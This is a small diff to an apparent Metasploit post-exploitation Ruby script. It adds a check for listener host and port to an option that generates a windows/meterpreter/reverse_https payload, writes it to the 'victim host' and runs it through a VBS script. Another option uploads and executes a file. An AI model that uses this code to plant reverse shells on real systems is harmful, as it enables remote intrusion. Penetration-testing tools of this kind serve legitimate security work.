@@ -46,11 +46,16 @@ when "-f"
     raise Rex::Script::Completed
   end
 when "-g"
-  filename = "script.vbs"
-  path_on_victim_host += filename
-  payload = generate_payload "windows/meterpreter/reverse_https", args[1], args[2], client
-  write_payload payload, path_on_victim_host, client
-  vbs_reverse_https path_on_victim_host, client
+  if args[1] and args[2]
+    filename = "script.vbs"
+    path_on_victim_host += filename
+    payload = generate_payload "windows/meterpreter/reverse_https", args[1], args[2], client
+    write_payload payload, path_on_victim_host, client
+    vbs_reverse_https path_on_victim_host, client
+  else
+    print_error "No lhost or lport specified"
+    raise Rex::Script::Completed
+  end
 else
   print_status "Usage:" 
   print_status "-f file: Uploads specified File and Executes it"
